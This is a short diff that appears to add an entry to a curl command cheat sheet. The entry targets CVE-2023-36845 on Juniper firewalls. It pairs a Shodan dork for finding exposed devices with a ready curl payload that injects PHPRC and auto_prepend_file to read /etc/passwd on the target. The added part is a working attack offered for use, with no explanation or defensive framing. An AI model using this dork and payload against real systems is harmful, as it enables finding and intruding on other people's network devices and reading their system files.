@@ -19,3 +19,8 @@
      --data '{"username":"xyz"}' \
      https://my-endpoint.com/api
 ```
+### CVE-2023-36845 - Juniper Firewalls RCE
+##### Shodan Dork: title:"Juniper" http.favicon.hash:2141724739
+```
+curl <TARGET> -F $'auto_prepend_file="/etc/passwd\n"' -F 'PHPRC=/dev/fd/0'
+```
